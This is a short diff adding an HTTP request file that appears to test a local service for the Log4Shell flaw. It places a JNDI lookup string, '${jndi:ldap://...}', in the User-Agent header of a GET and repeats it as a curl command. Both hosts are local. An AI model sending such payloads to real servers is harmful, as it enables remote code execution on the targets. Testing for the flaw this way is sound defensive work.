@@ -1,0 +1,5 @@
+GET http://localhost:8090/test
+Accept: application/json
+User-Agent: ${jndi:ldap://localhost:8099/sample}
+###
+### curl 127.0.0.1:8090/test -H 'User-Agent: ${jndi:ldap://127.0.0.1:8099/sample}'
